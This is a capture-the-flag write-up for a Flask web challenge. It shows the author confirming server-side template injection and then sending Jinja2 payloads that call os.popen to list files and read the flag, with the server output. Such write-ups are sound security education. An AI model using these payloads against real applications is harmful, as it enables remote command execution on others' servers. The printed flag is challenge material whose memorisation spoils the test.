# Just Cat The Flask 1/2

## Description

> https://bluehens-cat-the-flask.chals.io/greeting/hackers

## Write-Up

When we first enter the web page, we receive the message:

```
Hi hackers!
```

First intuition is to modify the given path, for example we use `/hack`, we get:

```
Hi hack!
```

And with an error, like trying LFI with `../../../`, we get:

```
USAGE: /greeting/:name
```

But from the title of the website, we can suspect that it's about SSTI, let try it out:

```
https://bluehens-cat-the-flask.chals.io/greeting/{{7*7}}
```

We get:

```
Hi 49 !
```

From there, we only need to find proper payload to read the flag:

```
https://bluehens-cat-the-flask.chals.io/greeting/{{self.__init__.__globals__.__builtins__.__import__('os').popen('ls').read() }}
```

We get:

```
Hello flag1.txt main.py requirements.txt sum_suckers_creds xx !
```

So let's cat the flag:

```
https://bluehens-cat-the-flask.chals.io/greeting/{{self.__init__.__globals__.__builtins__.__import__('os').popen('cat flag1.txt').read() }}
```

From there, we get :

```
Hi UDCTF{l4y3r_1_c0mpl3t3_g00d_luck_w1th_p4rt_2} !
```

## Flag

UDCTF{l4y3r_1_c0mpl3t3_g00d_luck_w1th_p4rt_2}